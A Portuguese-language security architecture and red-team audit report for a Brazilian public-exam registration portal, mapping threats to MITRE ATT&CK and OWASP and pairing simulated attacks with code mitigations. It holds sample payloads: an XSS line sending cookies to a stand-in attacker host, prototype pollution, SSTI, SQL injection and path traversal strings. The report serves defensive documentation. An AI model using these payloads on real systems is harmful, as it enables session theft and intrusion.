# Relatório de Arquitetura de Segurança & Auditoria Red Team (Luna & Quinn)

**Projeto:** JBA Consultorias e Soluções Públicas — Portal Institucional & Sistema de Gestão de Concursos Públicos  
**Classificação:** Documento Técnico de Engenharia Defensiva, Conformidade LGPD e Simulação Adversária (Red Team)  
**Padrões de Referência:** OWASP Top 10 (2021/2025), MITRE ATT&CK® Enterprise, Lei Geral de Proteção de Dados (Lei nº 13.709/2018), Lei de Licitações e Contratos Administrativos (Lei nº 14.133/2021)

---

## 1. Modelagem de Ameaças (Threat Modeling — GovTech & Concursos Públicos)

Portais de bancas organizadoras de concursos públicos (`/concursos` e `/api/inscricao`) e assessorias jurídicas/contábeis governamentais possuem superfície de ataque crítica. Durante a abertura e o encerramento de editais, esses sistemas enfrentam picos de tráfego legítimo combinados com tentativas de fraude cadastral, manipulação financeira de taxas (GRU/PIX), raspagem automatizada de dados pessoais (PII harvesting) e ataques de negação de serviço.

### Mapeamento MITRE ATT&CK® & OWASP Top 10

| Fase MITRE ATT&CK | Técnica / ID | Categoria OWASP | Risco Específico no Portal JBA | Controle Defensivo Implementado |
| :--- | :--- | :--- | :--- | :--- |
| **Reconnaissance** | Active Scanning (`T1595`) / Search Victim-Owned Websites (`T1594`) | A01:2021 Broken Access Control | Enumeração massiva de CPFs de candidatos inscritos ou varredura sequencial de números de protocolo (`IDOR`). | Rate limiting deslizante por IP (`checkRateLimit`), entropia criptográfica no protocolo (`crypto.getRandomValues`) e mascaramento obrigatório de PII (`maskCPF`). |
| **Initial Access** | Exploit Public-Facing Application (`T1190`) | A03:2021 Injection (XSS, SQLi, NoSQLi, SSTI) | Inserção de payloads `<script>`, `onerror=`, `{{7*7}}` ou operadores `$where`/`' OR 1=1` no nome do candidato ou em recursos administrativos para comprometer o painel do avaliador da banca. | Inspeção ativa via WAF interno (`detectAttackPayload`) e higienização canônica Unicode NFC (`sanitizeInput`) em `src/lib/security/validator.ts`. |
| **Execution / Tampering** | Web Session / Parameter Tampering (`T1565.002`) | A04:2021 Insecure Design | Manipulação do parâmetro `taxa` ou `valor` no JSON do `POST /api/inscricao` para gerar guia PIX/GRU de R$ 0,01 em cargo de nível superior (R$ 145,00). | Catálogo autoritativo exclusivamente no servidor (`CATALOGO_EDITAIS_SERVIDOR`) que ignora valores financeiros enviados pelo cliente e registra alerta de segurança. |
| **Defense Evasion / Spoofing** | Cross-Site Request Forgery & Clickjacking (`T1185`) | A05:2021 Security Misconfiguration | Encapsulamento do formulário de inscrição em `<iframe>` malicioso (Clickjacking) ou submissão forjada entre domínios (CSRF). | Hook global `src/hooks.server.ts` com verificação de `Origin`/`Sec-Fetch-Site`, `X-Frame-Options: DENY` e `Content-Security-Policy: frame-ancestors 'none'`. |
| **Impact** | Endpoint Denial of Service (`T1499`) | A06 / API4:2023 Unrestricted Resource Consumption | Inundação de requisições `POST /api/inscricao` com payloads gigantes ou bots de inscrição automatizada no último minuto do edital. | Limite estrito de payload (16 KB) com rejeição HTTP 413 e Rate Limiting em duas camadas (borda global + bucket específico por operação). |

---

## 2. Matriz de Simulação de Ataques Red Team & Mitigações no Código

Abaixo estão documentados os cenários de ataque executados durante a auditoria adversarial (Red Team) e como o código-fonte neutraliza cada vetor:

### Vetor 1: Stored/Reflected XSS no Nome do Candidato ou Pedido de Atendimento Especial
* **Payload Simulado:**
  ```json
  {
    "nome": "João Silva <img src=x onerror=fetch('https://attacker.tld/steal?c='+document.cookie)>",
    "necessidadeEspecial": "javascript:alert(document.domain)"
  }
  ```
* **Mitigação Aplicada:**
  1. Em [`src/routes/api/inscricao/+server.ts`](file:///c:/Users/ventj/JBA/src/routes/api/inscricao/+server.ts), todas as chaves e valores textuais do JSON passam por [`detectAttackPayload`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts) antes de qualquer processamento. O ataque é imediatamente abortado com `HTTP 400` (`WAF_PAYLOAD_REJECTED`) e registrado em log de auditoria.
  2. Como segunda camada (Defense-in-Depth), [`sanitizeInput`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts) remove tags HTML, atributos `on*=`, pseudo-protocolos `javascript:` e caracteres de controle ASCII, além de o navegador receber `Content-Security-Policy` restritiva via [`src/hooks.server.ts`](file:///c:/Users/ventj/JBA/src/hooks.server.ts).

### Vetor 2: Adulteração de Preço / Taxa de Inscrição (Parameter Tampering)
* **Payload Simulado:**
  ```json
  {
    "editalId": "edital-001-2026",
    "cargoId": "auditor-fiscal",
    "taxa": 1.00,
    "valor": 0.00
  }
  ```
* **Mitigação Aplicada:**
  * A função `resolveServerEditalAndCargo` em [`src/routes/api/inscricao/+server.ts`](file:///c:/Users/ventj/JBA/src/routes/api/inscricao/+server.ts) consulta apenas o mapa imutável `CATALOGO_EDITAIS_SERVIDOR` no back-end. Para `auditor-fiscal` no `edital-001-2026`, o servidor impõe `R$ 145,00` independentemente do que o cliente enviou, registrando um alerta `[JBA-SECURITY-ALERT]` caso detecte divergência entre um campo financeiro enviado pelo cliente e o valor oficial do edital.

### Vetor 3: Inscrição com CPF Falso ou Gerado Aleatoriamente (`111.111.111-11` / Dígitos Inválidos)
* **Payload Simulado:**
  * Submissão de `cpf: "111.111.111-11"` ou `cpf: "123.456.789-00"`.
* **Mitigação Aplicada:**
  * A função [`validateCPF`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts) executa o algoritmo oficial Módulo-11 da Receita Federal do Brasil:
    * Remove caracteres não numéricos e exige exatamente 11 dígitos;
    * Rejeita todas as sequências repetidas (`000...` até `999...`);
    * Calcula o 1º dígito verificador (pesos 10 a 2) e o 2º dígito verificador (pesos 11 a 2), rejeitando com `HTTP 400` (`INVALID_CPF_MOD11`) qualquer CPF matematicamente inválido.

### Vetor 4: Enumeração de Candidatos e Vazamento de PII via Consulta de Protocolo (`GET /api/inscricao`)
* **Payload Simulado:**
  * Script automatizado consultando CPFs de terceiros para descobrir endereço de e-mail completo, telefone e CPF em texto claro.
* **Mitigação Aplicada:**
  1. O endpoint `GET /api/inscricao` possui rate limit específico (`20 req/min` por IP) além do limite global de API (`45 req/min`).
  2. O objeto retornado **jamais** inclui o CPF completo (`cpfHashKey` é desestruturado e descartado no servidor), expondo exclusivamente o formato mascarado LGPD (`***.000.001-**` via [`maskCPF`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts)), e-mail parcialmente oculto (`ca***@candidato.gov.br`) e telefone mascarado (`(48) *****-0191`).

### Vetor 5: Server-Side Template Injection (SSTI) & Prototype Pollution
* **Payload Simulado:**
  ```json
  {
    "__proto__": { "isAdmin": true },
    "nome": "{{7*7}} ${process.env}"
  }
  ```
* **Mitigação Aplicada:**
  * O motor [`detectAttackPayload`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts) inspeciona tanto as **chaves** quanto os **valores** do objeto JSON contra expressões de Prototype Pollution (`__proto__`, `constructor.prototype`), SSTI (`{{...}}`, `${...}`, `<%...%>`) e Path Traversal (`../../etc/passwd`), bloqueando imediatamente a transação.

---

## 3. Conformidade LGPD (Lei nº 13.709/2018) e Integridade Criptográfica SHA-256

### Minimização de Dados e Mascaramento Nativo (Art. 6º, III e VII da LGPD)
* **Coleta com Consentimento Explícito:** Nenhuma inscrição é processada sem a confirmação explícita de `aceiteEdital` e `aceiteLgpd` validada no servidor (`MISSING_LEGAL_CONSENT`).
* **Mascaramento de Dados Pessoais em Comprovantes:** A função [`maskCPF`](file:///c:/Users/ventj/JBA/src/lib/security/validator.ts) transforma o CPF no padrão `***.456.789-**`, permitindo que o próprio candidato reconheça seu comprovante e que fiscais de sala validem o protocolo sem expor o documento integral em telas públicas ou impressões.

### Assinatura de Integridade do Comprovante (`generateIntegrityHash`)
Cada inscrição homologada recebe um código `integrityHash` de 64 caracteres hexadecimais gerado pela Web Crypto API padrão (`crypto.subtle.digest('SHA-256', ...)`):
* **Canonicidade:** As chaves do comprovante (`cargoId`, `cpf`, `dataHoraInscricao`, `editalId`, `nome`, `protocolo`, `taxaInscricao`) são ordenadas alfabeticamente e concatenadas com o salt institucional da banca antes da geração do resumo criptográfico SHA-256.
* **Prevenção de Fraude Documental:** Caso um candidato mal-intencionado edite o HTML/PDF do comprovante para alegar que se inscreveu em outro cargo ou em outra data, o hash SHA-256 divergirá da assinatura calculada pela Banca JBA, garantindo autenticidade perante auditorias do Tribunal de Contas (TCE) e do Ministério Público.
